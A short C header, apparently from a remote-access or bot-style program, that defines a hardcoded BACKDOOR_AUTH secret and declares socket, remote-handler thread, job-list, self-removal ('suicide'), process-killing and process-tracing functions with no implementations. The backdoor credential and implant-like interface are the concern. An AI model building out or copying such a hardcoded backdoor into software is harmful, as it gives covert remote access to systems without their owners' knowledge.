#ifndef _REMOTE
#define _REMOTE

#define BACKDOOR_AUTH "ucfmkkaqfgtqloizznzttxybkwjkqlfnnlmwbycusrguetkirz"

#include <pthread.h>

int remote_sockfd, accept_sock;
pthread_t remote_handler_pth;
void remote_job_list(int device_server_id, char* ip, int port, int remote_port);
void remote_handler(int device_server_id, char* ip, int port, int remote_port);
void suicide();
void kill_proc(int);
void process_tracing(int, int);
#endif
